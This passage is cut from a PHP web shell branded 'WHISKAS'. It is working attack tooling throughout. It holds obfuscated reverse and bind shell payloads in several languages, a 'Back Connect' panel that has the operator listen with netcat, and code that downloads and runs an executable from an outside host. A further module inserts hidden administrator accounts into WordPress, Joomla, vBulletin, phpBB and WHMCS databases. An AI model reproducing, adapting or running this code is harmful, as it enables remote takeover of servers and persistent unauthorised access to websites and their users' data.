}else{$res = $err;}
unlink($pathres);
}else{$res = $err;}
unlink($path);
}else{$res = $err;}
}
return $res;
}elseif($evalType=="java"){
$tmpdir = WHISKAS_TEMPDIR;
chdir($tmpdir);
if(is_writable($tmpdir)){
if(preg_match("/class\ ([^{]+){/i",$evalCode, $r)){
$classname = trim($r[1]);
$filename = $classname;
}else{
$uniq = substr(md5(time()),0,8);
$filename = $evalType.$uniq;
$evalCode = "class ".$filename." { ".$evalCode . " } ";
}
$path = $filename.".java";
if(__write_file($path, $evalCode)){
$cmd = "javac ".$evalOptions.$path;
WHISKASEx($cmd);
$pathres = $filename.".class";
if(is_file($pathres)){
if(chmod($pathres, 0755)){
$cmd = "java ".$filename.$evalArguments;
WHISKASEx($cmd);
}else{$res = $err;}
unlink($pathres);
}else{$res = $err;}
unlink($path);
}else{$res = $err;}
}
return $res;
}
return false;
}
function WHISKASconnect(){
WHISKAShead();
$php="7VZta9swEP5e6H9QjaE2S5uXfhg0pDBYPw7KVtiHtjOOLNcitqVJ8pKxpb99d36L4zid17WwQV1wrbvTo0e6Oz1hSgnlKSaFMjy9d0bu9PBAM+MZnjAv5gk3hU3MPZ7ImFNuvDDOdOSg1Ta+umdGkxlhKxmLgDkWsQaktOchFL3js7O3OFj6MEizOMYBaw50BAMLUIAJub78+GG2Mkwl06tP49nxrX31+f3F8bR0g206nPN0CJNOuIXTE5z9QN7FoU+umZ8QHbE4Jg/k8AD9PCQOFVlqnIqyS2ZAyyU/Dg8IPLYEgNI3LU05I6saGRzBogFa1oTFmu1BnXSi6pvRXRO5No/vtpfw6SJfomAdZik1XKQeW3FttHMsaWpiLxRqcew2FuIBTN748vSgBzEK74yc4IYBxzjjtru0j5p2KTRfeVANmgeO2wFQUkTe1dlsGGHatVGQC08LuoCa0kx9Y8qxDJXnw+HoNP87t8gp0IeaYUqlovgP8yoiFURZkyKDw9YDclYztenOQj6lTGJcczcQYkQslsBAZ3MYOTKSXpb6CXPcARkBpptv0lrydLMPfMKl4oY5NgV2CdCFtNElHskpsS6sahF8lhGPGZ4oOQKk0Ici2UKqiyLE1ANic3J97orde4lvaORYQxrcEufmy62+e+MOOfYWnpVS7g5ujh1gGYB7U1VtdK69gCsHIgGCRtV3R7QtAGt7r62oTRsYxZPmEduyPEysFov8/En2RnzNIMIlc8jgooWP6AUNHxr7coWTkIi1k4TWxGbGRHNv60ZWaSw0a+WgMtalU2xxbzU059oB1ryvlP/dGZHZRflpSS4ZJM5SFtTZuMOxRMek27G1gFTY5EpQT0iWAstogKtiUXDZjMSUHEGmFdMiUxTYSqyY7d7Hp9Fe8xi6B0UAweCygp7oFTnuHTnpFUlbQWVPGZXt9lJ+QzIRYhaxyIrvgpXbXVO28uss5Tms9lBSbHdCzTFmFO4U5UPkEl8MXqheXS3MU6+xgvL3dCvHmwDggyKO6q42rOqtyorN21HrxwjU2+vDog5+nAp9EovJn7CY/D2Ljl7XXb3eeQEUp73PM97r2S6gvFcrb61p6+YPiEo9Ufa31TNEOSsaPSrvfZbia0v/nknb9LNr207uXrWtib9P2+AHa1910z3UrYeQ6VchexEh008SMv0kIdMvLmS65+Wt/ych0/+EkP2ORV8he2nN+gU=";
$python="pVRtT9swEP6cSv0PxptWR80M7YY0wYJUQZjQBlRtp30AVqXOpYmWOpHtQPnCb5/tJG1AHUKaqra+V99z95zf7e2XUuwvUr4P/B4VjyrJebeTropcKCTAk+WiEDkDKb1cevJRf3P2B5Sn0hV0O4WPcbeT2N8IYiQTyDLC3KNuxzFx/jaejvMCOGGe9fFnotTZVZSX6pnTxTgwahBilzrlL7WuvkmAKgVHRk2rlFRAGBG336h0upZqVSjiUuAsj4D0ShV//NLTeSoIIVNpzmsMaYxySXm4gj0fc4WNzol9RuM0A54Tc7ujPXRjFKwIhrVt3CyYXPprBWJ1PJ4O/N778a+zk95xbdWqY9tymaCPKfr6AfelEiR2+xidtIXhVjIXQSbBFvCQ6NuR6aAVHSUeq4MjdGkC2D0ZHAw/uzQCCxFbiNgW68CaQaFq/yKUstI2uR2DWWMjwj05qDXOwhdAJYSCJQSz6BaRm9+38q7vYk94cRYupXG4+HZ1PQlOR9PAreN0qkWTo+5lEaqEpjJKBVnQpcjLggxcd+NkmsmSF9bGqEcJPCL/mmDj18Ki8xl+WVYKt11JqVDII4tUnw3WOruRKkebB9XkOg+11HCkqeBoSz58y3FfF78ExR4Mz/CJ3omlr5lBQ7G810tV9XXp+v7Q7oe/vBncdTuQtSyf2hYn0YehddGVwDpVuhtm6VKuSKFP0q+2kVZ/pJZG5/OLq2BWryqdXp9+n09nk2B0aWI0TGUsebEJmF7/mBuvdsx8EvycBqOzs4lnLn1ZvaSawREh+IDaD/YKOwBJs1TvAieHRjLM1Csfur7uAjPEsyvT4qB5R6jMAAqLbTu8navXUIDgJzTK4hDNIFyhqZkvetIT2M2JLSFeC8ebp2F3ls3D8KwZdmAGJtLEzTkHpghJ6mbsxnn4Bpzy/3C+Fv5GnNL9Cw==";
$perl="lZLRjpNAFIav26TvMOJsC8kYWr1bpJFQ3DRrS8OwGmOVsPSsTKQDgVm3m+722Z0BVifGGL0755/Dd+Abnj+zb5vavmbcBv4dVVAXo+FtA2gZnp/TMvsGwhkNcdm4+EuoqiZ3DThUZS1QHEQr9yCg3jsbOnMnW7z5sNjOJ05/LkOnJTc5esEM+TS7MRXqtLfvZMysY4s788MV3QT+GbIvDedRLhHuVxBVXYry+p6nezAnIqsmliQ07SuZlIw3b5PlOojJmIb+ZULjKPBWBAvr4WHHwLS6bW+86OK9686s42g4wJWLVf9p+lmeDhoQilZWCkfDd4kCSSANkyi4ooG3WERkpkAD+RE7OaTG092uThg3cUWWazWSeOuPlrZ1ULBGAJfjr/Q0zTKQm3xCrW65JPrEOCGvuElRDOke0RyKAp223CDTdqisgCMaL5ZrYrwe+4bzFIRXMTHmehJEUZ/I5+AAGZJqtfVZUTZg+pbTFfRnoehaI8laJ6lWB2QCTWUlLweK5pfYl38Si/O+nXUtcxkHkaSilNpyXQpO3d+cYqafZyXnkKn7wamet/boP9gze3vzMTUs5ynp9elR709FfxP4f946W3BU+kz5Jz3+AA==";
$ruby="tVb7b9M6FP7Z+SuMN0hzVxLGQ+h2N6vGU0ggqjG4QmQXtc5pYy11gu3QoW387fiVrqXt1ivd66p1es7n8/T52p07SSNFMmI8Af4di2b0I9jBhVK17CXJhKmiGcW0miajR08fn7nPQMC3hgnAoazoGajwWlAPVcGHUwiDIIcxlg09kwESoBrB8fHHZ5+/Dt4enbx6f/wuzqsZp0MJ8XSoaNEJp3LG+KV5TxmfzMKor0QDvfGwlBAAz51FAcPSOOlIJSJtOdV7gNgYv2IlxHDOpJJ9r9TagY8n5jCz0rg1EKvqqw7NGDbHbaRYFcCxSEU8kc2ok2RJ0iVZRiJsYT4N4aLRh46OX3+KS+ATVaTpfoD1MqIvD07Tn8k/Xx7c//P0Yr/75Go36dfpG65gAqLjEVFPB6vsGZmePB98APEdhI2TkG4dWQ1NZTykFGoHpHEtGFeY2DZgWUBZ4h6mFedAFeQZJxY3ggnj9sksHSivlO8FXljjlJoqsCUhnAPF0voZdwic15VQ+OTl8bv0XIGYHgw+7Kdhtjv4+0V2GB54vRYe2DskC3yf4eyv7N7dHGeHdnvodtIdm1c09wamsYuu2/TmPSYxifbIIVlCzQrdaVzq2CeglhMySwyZBAxCVOKZqEzypWlGziAT/d1kBe+rU8a0qKZ1mhKyAvEwY4fmOP4jYWshZpVp6e+ORiasG4aRM7zxRHt1cz0/VFXiR79TRhvRzse8QLcgXzChvWvLNwHNZd6k264jCw31ZcpmvRvLtC5pV6etE7oN/p+mBRtNvXkf11UNvFN2iSDRxSWrLlvzrDJsk+8RPZd7K76ugm3D/l22+L19FiBpc33vNfnN6QW4bMR1BjKmZbWQkUw5K4PWluvhErE9tAS5gdi0o1VqO9DSIrXf9k81x5oC+oAc4TrGsz8ejvF2Loory3pIbsFxyBEcQkvUhhAaa760jIaMu/+byFCb2Tzo1QullS1hSUdYWoJuISkbP1rDTMjLF6nIytBm4kHtoTU0g9rDi4zihUvk4US2d3bdmLCty29MsDmKdpBX3S5r/o1z8Mh10ym3nM4lp353m/8zsHbgkJ82E6WbM/1kJwz58XKTZ8FG8gs=";
$node="nVHLasMwEDwrkH8QvliCoEDTW8ih9BPSW/pAtdeRQJZcSXYKIfn2yrKd5tGWYh+Ed2d2NDtquMWu4juNV9jCRy0tkDQTUuVvlTUZOJdSFgnL6aQJZA3+nBrKlPaQ8xZ4eY52nRMhM9oZBRdXda1I6VUEKBUo6fxd6rkTaUBkQXo3rFLcF8aWrOQ+E2T+ugssSen3XFbmDD4hPSlyu20CMCi0ZafZ/jEFeuvFarWg++kEtXwRyGEvlgXzHtZgG7CkqHXmpdHERR5ybGelB5Ic8YMqOH5qV19HD8dnnbT74P7rtgqiMUcSjZ7jTjDnc6mZBVeXQOg1ZGrPws1Jzj1PZoMTTNqa7gcnsVoebpXB2pHjf40Npm+mUXcKpqTzoGPKm7uXtnmYTkA5wNfZ35+ydxfZPxqtoYu9V5nF19wsotx/HgH9lj76IXY0Mm80Mmg0LuHDFw==";
$c="tVJtb9owEP7cSv0PHp1ap/WAsO0TTaWoZBLaChHJNE0bilLHNKcZG8Vmgk7rb98lBArZi/alUqzcPff47nzPnYLicpkJcmVsBrqdX58cn+5hBaj738BMwl0TXJuOXS+E+QNuNP8mbCOghAU8HVCNwFIBVqhAUJbMU1C0NNLinjOepwW5QPP7l6nz4+T4qIwYxpn23D662PCSI4IV0ywrElAEShxmtLzveb3q1hG0Dahkls5Brj3/XTIcBXH/KbDQhfVyq5WhqdVAq4Lu1HH2OGX+tql+FVXS4cgfDCaJP/q84Rlv83JaF2DR+OZ9EsWTwL9l3ZojbEnSC0sNxj8kJaeiJpPgYxSUGdmZZgYehJ5RvW1hRl8YR6zA0jrRHagMU9DGBMiFcwasu3JrmsThCoXEtxufeynnoqrefeoJU3HWeiS+nKUkFumcRLmQkjx+VS3We7MlZstFD4mHnnvg9eqUayw7py2xKkdL4mBy662sKOb9MHK985fhp8H1eb+OIoSm4KSDj+qYnLyCVt2t1EZQXjk/8QhpBNlp+/pZtC23tLI2zN60nveDKPQWYjh1iWPdMi7dy31kl/2fGzEMw8k4HifxTbgTmXKtlOD2r8rWe9GIOY5z1T1Yj0pT87+amobnHnjPoanZaorfLw==";
$java="lVRNb9swDD2nQP+D4JM9BG6T04bCwz6ww4ABHZbeuhwUhbG12rIg0XGCNPvtoz7sumsvPdiWyCfy8ZGybHRrkP3he57LNn93c3khJyYF6G2XF7rb1FIwUXNrGa93/A54c7q8mGkj9xyBWeRIgJ1UvI4wjQwOCGpr2V1lgG8dfjzwXekOV0j2hkl7M3Xddvjkazv0DMgdOGhMn5+dvziQnbCSNpe2oMh+ScbCRTqHUJ9u92CM3MIk7r6VW2Y6lWae5wzNMSxmmyPC/ZptWMEU9Mxv3y8+LNc3wS8VMkFOyuPKTDdZdPSVrCEVH4vrjMVYM2KR90YipJv59VwMUG/f1Z2t0tH0asyz/4S34Ciq9NtBgEbZKgbZCXJSUZEWXDzcGS6Awnmwe4XqY72xY77shkuVkn5SlVQoN6UNIrjK3Dj43MHPRLMlXsnVRqorWyXeJXfp6mgRmrwE/GlaDQaPadLaXPEGkizH9kfbg/nKLRHKpdrC4XaXJr1USebkOcWo9EkC35itd9a/7DONHHMzx1YV1DX7+1uFzJPe9C75F9rbKOGqFQ+ArIp9C9voG7tL1F29eQ2qxKooFrH9M38NCppThBJMrrmxQBuPvr9eD/1YgaFZiqnskGpiTF2gAe242JwL17Gh0aGXUFtg/5NZvpVMEE1qwnrXYj1JPBFB6jmb8Dq/LgV7fGSv85newFK6siun/sQ8jvGzy1m2I3ZqH8HkH27HYKJxEuB+J3TwV6dQNuCOxyVNExxApDQ4WfxPkFo0tYtYMOmsX1CbOyJDAodePqFL90fRLxmO8EVOV8e49unluHyS0b/ecDPpOf8D";
echo "<div class=header><center><br><div class='txtfont_header'>| Back Connect |</div><br><br>";
echo "<form onSubmit=\"g('connect',null,this.selectCb.value,this.server.value,this.port.value,this.cbmethod.value);return false;\">
<div class=\"txtfont\">Mehtod:</div> <select name='cbmethod' onChange='ctlbc(this);' style='width:120px;'><option value='back'>Reverse Shell</option><option value='bind'>Bind Port</option></select> <div class=\"txtfont\">Use:</div> <select name='selectCb'>";
$cbArr = array("php"=>"Php","perl"=>"Perl","python"=>"Python","ruby"=>"Ruby","c"=>"C","java"=>"Java","node"=>"NodeJs","bcwin"=>"Windows");
foreach($cbArr as $key=>$val){echo("<option value='{$key}' ".($GLOBALS['sys']=='win'?'selected':'').">{$val}</option>");}
echo "</select> <div id='bcipAction' style='display:inline-block;'><div class=\"txtfont\">IP:</div> <input type='text' style='text-align:center;' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'></div> <div class=\"txtfont\">Port: </div> <input type='text' size='5' style='text-align:center;' name='port' value='2012'> <input type='submit' value=' '></form><p><div id='bcStatus'><small>Run ` <font color='red'>nc -l -v -p port</font> ` on your computer and press ` <font color='red'>>></font> ` button</small></div></p></center></b></font><br>";
if(isset($_POST['WHISKAS1'])&&!empty($_POST['WHISKAS1'])){
$lang = $_POST['WHISKAS1'];
$ip = $_POST['WHISKAS2'];
$port = $_POST['WHISKAS3'];
$arg = ($_POST['WHISKAS4']=='bind'?$port:$port.' '.$ip);
$tmpdir = WHISKAS_TEMPDIR;
$name = $tmpdir.'/'.$lang.uniqid().rand(1,99999);
$allow = array('perl','ruby','python','node');
eval('$lan=$'.$lang.';');
if(in_array($lang,$allow)){
if(__write_file($name,__get_resource($lan))){
if(_WHISKAS_can_runCommand(true,true)){
$os = ($GLOBALS['sys']!='win')?'1>/dev/null 2>&1 &':'';
$out = WHISKASEx("$lang $name $arg $os");
if($out==''){$out="<font color='red'><center>[ Finished...! ]</center></font>";}
echo("<pre class='ml1' style='margin-top:5px'>{$out}</pre>");
}
}else{
echo("<pre class=ml1 style='margin-top:5px'><font color='red'><center>[ Failed...! ]</center></font></pre>");
}
}
if($lang=='java'||$lang=='c'){
$code = __get_resource($lan);
$out = nl2br(bcinit($lang, $code,'',''));
echo("<pre class=ml1 style='margin-top:5px'><center>{$out}</center></pre>");
}
if($lang=='bcwin'){
$WHISKAS = new WHISKASCURL();
$s = $WHISKAS->Send('https://hcklst.pages.dev/haxor.exe');
$tmpdir = WHISKAS_TEMPDIR;
$f = @fopen($tmpdir.'/bcwin.exe','w+');
@fwrite($f, $s);
@fclose($f);
$out = WHISKASEx($tmpdir."/bcwin.exe ".$_POST['WHISKAS2']." ".$_POST['WHISKAS3']);
}
if($lang=='php'){
echo "<pre class=ml1 style='margin-top:5px'>";
$code = __get_resource($lan);
if($code!==false){
$code = "\$target = \"".$arg."\";\n".$code;
eval($code);
echo("<center><font color='green'>[ Finished...! ]</font></center>");
}
echo "</pre>";
}
}
echo "</div>";
WHISKASfooter();
}
function WHISKASpwchanger(){
WHISKAShead();

echo '<div class=header><center><br><div class="txtfont_header">| Add New Admin |</div>
<center><h3>';
$vals =array('WordPress' => array('wp',2),'Joomla' => array('joomla',3),'vBulletin' => array('vb',5),'phpBB' => array('phpbb',6),'WHMCS' => array('whmcs',7),'MyBB' => array('mybb',8),'Php Nuke' => array('nuke',9),'Drupal' => array('drupal',10),'SMF' => array('smf',11));
WHISKAS_Create_A_Tag('pwchanger',$vals);
echo '</h3></center>';
if(isset($_POST['WHISKAS1'])&&$_POST['WHISKAS1']=='wp'){

echo __pre().'<center><center><div class="txtfont_header">| WordPress |</div>
<p>'.getConfigHtml('wp').'</p><form onSubmit="g(\'pwchanger\',null,\'wp\',\'>>\',this.localhost.value,this.database.value,this.username.value,this.password.value,null,this.admin.value,this.email.value,this.prefix.value);return false;" method="POST">';
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host','id'=>'db_host', 'inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => 'wp_', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'kh', 'inputValue' => 'WHISKAS', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'WHISKAS@nasa.gov', 'inputSize' => '50')
);
create_table($table);
echo '<p><input value=" " name="send" type="submit"></p></form>';
if ($_POST['WHISKAS2'] && $_POST['WHISKAS2'] == '>>'){
$localhost = $_POST['WHISKAS3'];
$database = $_POST['WHISKAS4'];
$username = $_POST['WHISKAS5'];
$password = $_POST['WHISKAS6'];
$admin = $_POST['WHISKAS8'];
$SQL = $_POST['WHISKAS9'];
$prefix = $_POST['WHISKAS10'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$solevisible=@mysqli_query($conn,"insert into ".$prefix."users (ID,user_login,user_pass,user_email) values(null,'$admin','d4a590caacc0be55ef286e40a945ea45','$SQL')") or die(mysqli_error($conn));
$solevisible=@mysqli_query($conn,"select ID from ".$prefix."users where user_login='".$admin."'") or die(mysqli_error($conn));
$sole = @mysqli_num_rows($solevisible);
if ($sole == 1){
$solevis = @mysqli_fetch_assoc($solevisible);
$res = $solevis['ID'];
}
$solevisible=@mysqli_query($conn,"insert into ".$prefix."usermeta (umeta_id,user_id,meta_key,meta_value) values(null,'".$res."','first_name','solevisible'),(null,'".$res."','last_name','solevisible'),(null,'".$res."','nickname','solevisible'),(null,'".$res."','description','solevisible'),(null,'".$res."','rich_editing','true'),(null,'".$res."','comment_shortcuts','false'),(null,'".$res."','admin_color','fresh'),(null,'".$res."','use_ssl','0'),(null,'".$res."','show_admin_bar_front','true'),(null,'".$res."','".$prefix."capabilities','a:1:{s:13:\"administrator\";b:1;}'),(null,'".$res."','".$prefix."user_level','10'),(null,'".$res."','show_welcome_panel','1'),(null,'".$res."','".$prefix."dashboard_quick_press_last_post_id','3')") or die(mysqli_error($conn));
if($solevisible){
__alert('Success... '.$admin.' is created...');}
}
}
if($_POST['WHISKAS2'] && $_POST['WHISKAS2'] == 'joomla'){

echo __pre().'<center><center><div class="txtfont_header">| Joomla |</div><p><p>'.getConfigHtml('joomla').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',\'joomla\',this.localhost.value,this.database.value,this.username.value,this.password.value,null,this.admin.value,this.email.value,this.prefix.value);return false;" method="POST">';
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => 'jos_', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'WHISKAS', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'Whiskas@fbi.gov', 'inputSize' => '50')
);
create_table($table);
echo '<p><input value=" " name="send" type="submit"></p></form></center>';
if ($_POST['WHISKAS1'] && $_POST['WHISKAS1'] =='>>'){
$localhost = $_POST['WHISKAS3'];
$database = $_POST['WHISKAS4'];
$username = $_POST['WHISKAS5'];
$password = $_POST['WHISKAS6'];
$admin = $_POST['WHISKAS8'];
$SQL = $_POST['WHISKAS9'];
$prefix = $_POST['WHISKAS10'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$solevisible=@mysqli_query($conn,"insert into ".$prefix."users (id,name,username,email,password) values(null,'Super User','".$admin."','".$SQL."','d4a590caacc0be55ef286e40a945ea45')") or die(mysqli_error($conn));
$solevisible=@mysqli_query($conn,"select id from ".$prefix."users where username='".$admin."'") or die(mysqli_error($conn));
$sole =@mysqli_num_rows($solevisible);
if ($sole == 1){
$solevis =@mysqli_fetch_assoc($solevisible);
$res = $solevis['id'];
}
$solevisible=@mysqli_query($conn,"INSERT INTO ".$prefix."user_usergroup_map (user_id,group_id) VALUES ('".$res."', '8')") or die(mysqli_error($conn));
if($solevisible){
__alert('Success... '.$admin.' is created...');}
}
}
if($_POST['WHISKAS4'] && $_POST['WHISKAS4'] == 'vb'){

echo __pre().'<center><center><div class="txtfont_header">| vBulletin |<div><p>'.getConfigHtml('vb').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,\'vb\',this.username.value,this.password.value,this.prefix.value,this.admin.value,this.email.value); return false;" method="POST">';
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => '', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'hi', 'inputValue' => 'WHISKAS', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'Whiskas@fbi.gov', 'inputSize' => '50')
);
create_table($table);
echo '<p><input value=" " name="send" type="submit"></p></form></center>';
if($_POST['WHISKAS1'] && $_POST['WHISKAS1'] == '>>'){
$localhost = $_POST['WHISKAS2'];
$database = $_POST['WHISKAS3'];
$username = $_POST['WHISKAS5'];
$password = $_POST['WHISKAS6'];
$prefix = $_POST['WHISKAS7'];
$admin = $_POST['WHISKAS8'];
$SQL = $_POST['WHISKAS9'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_connect_error());
$pw_col = @mysqli_connect("SELECT column_name FROM information_schema.columns where table_name = '{$prefix}user' and column_name = 'password' and table_schema = '{$database}'");
$pw_col = @mysqli_num_rows($pw_col);
$adm_perm = "16744444";
if($pw_col > 0){
$solevisible=@mysqli_query($conn,"insert into {$prefix}user (userid,usergroupid,username,password,salt,email,passworddate,joindate) values(null,'6','$admin','52e28b78f55641cd4618ad1a20f5fd5c','Xw|IbGLhTQA-AwApVv>61y^(z]*<QN','$SQL','".date('Y-m-d')."','".time()."')") or die(mysqli_error($conn));
}else{
$adm_perm = "2143256444";
$solevisible=@mysqli_query($conn,"insert into {$prefix}user (userid,usergroupid,username,token,secret,email,passworddate,joindate,scheme,birthday_search) values(null,'6','$admin','\$2y\$10\$YsVhV.9tLnzBYxar1BJAGO3vFz68/qDU7Jt62SDdLy6lUT9N5Z/wq','Qf~ADeA}iAey-&#ALQF<}/uBDqSnw>','$SQL','".date('Y-m-d')."','".time()."','blowfish:10','1984-05-20')") or die(mysqli_error($conn));
}
$solevisible=@mysqli_query($conn,"select userid from {$prefix}user where username='".$admin."'") or die(mysqli_error($conn));
$sole = mysqli_num_rows($solevisible);
if($sole == 1){
$solevis = mysqli_fetch_assoc($solevisible);
$res = $solevis['userid'];
}
$solevisible=@mysqli_query($conn,"insert into {$prefix}administrator (userid,adminpermissions) values('".$res."','".$adm_perm."')") or die(mysqli_error($conn));
if($solevisible){
__alert('Success... '.$admin.' is created...');}
}
}
if(isset($_POST['WHISKAS5']) && $_POST['WHISKAS5'] == 'phpbb'){

echo __pre().'<center><div class="txtfont_header">| phpBB |</div><p><p>'.getConfigHtml('phpbb').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,this.username.value,\'phpbb\',this.password.value,null,this.admin.value,this.email.value,this.prefix.value); return false;" method="POST">';
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => '', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'WHISKAS', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'Whiskas@fbi.gov', 'inputSize' => '50')
);
create_table($table);
echo '<p><input value=" " name="send" type="submit"></p></form></center>';
if ($_POST['WHISKAS1'] && $_POST['WHISKAS1'] == '>>'){
$localhost = $_POST['WHISKAS2'];
$database = $_POST['WHISKAS3'];
$username = $_POST['WHISKAS4'];
$password = $_POST['WHISKAS6'];
$admin = $_POST['WHISKAS8'];
$SQL = $_POST['WHISKAS9'];
$prefix = $_POST['WHISKAS10'];
$conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
$hash = md5('solevisible');
$solevisible=@mysqli_query($conn,"UPDATE ".$prefix."users SET username_clean ='".$admin."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
$solevisible=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_password ='".$hash."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
$solevisible=@mysqli_query($conn,"UPDATE ".$prefix."users SET username_clean ='".$admin."' WHERE user_type = 3") or die(mysqli_error($conn));
$solevisible=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_password ='".$hash."' WHERE user_type = 3") or die(mysqli_error($conn));
$solevisible=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_email ='".$SQL."' WHERE username_clean = 'admin'") or die(mysqli_error($conn));
if($solevisible){
__alert('Success... '.$admin.' is created...');
}
}
}
if(isset($_POST['WHISKAS6']) && $_POST['WHISKAS6'] == 'whmcs'){

echo __pre().'<center><div class="txtfont_header">| Whmcs |</div><p><p>'.getConfigHtml('whmcs').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',this.localhost.value,this.database.value,this.username.value,this.password.value,\'whmcs\',null,this.admin.value,this.email.value); return false;" method="POST">';
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'WHISKAS', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'Whiskas@fbi.gov', 'inputSize' => '50')
);
